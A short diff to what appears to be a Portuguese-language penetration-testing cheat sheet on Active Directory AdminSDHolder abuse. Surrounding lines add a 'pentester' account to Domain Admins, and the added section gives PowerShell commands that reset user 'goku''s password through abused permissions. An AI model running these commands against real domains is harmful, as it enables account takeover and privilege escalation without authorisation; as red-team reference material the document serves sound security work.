@@ -1634,6 +1634,14 @@ Invoke-SDPropagator -timeoutminutes 1 -ShowProgress -Verbose
 ```
 Add-ADGroupMember -Identity 'Domain Admins' -Members pentester
 ```
+##### ADMIN SDHOLDER - ABUSSAR DE PERMISSÃO PARA TROCAR A SENHA DE UM USUARIO
+```
+$MyPassword = ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc
+Set-ADAccountPassword -Identity goku -Reset -NewPassword $MyPassword
+```
+```
+Set-ADAccountPassword -Identity goku -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc) -Verbose
+```
 
 
 
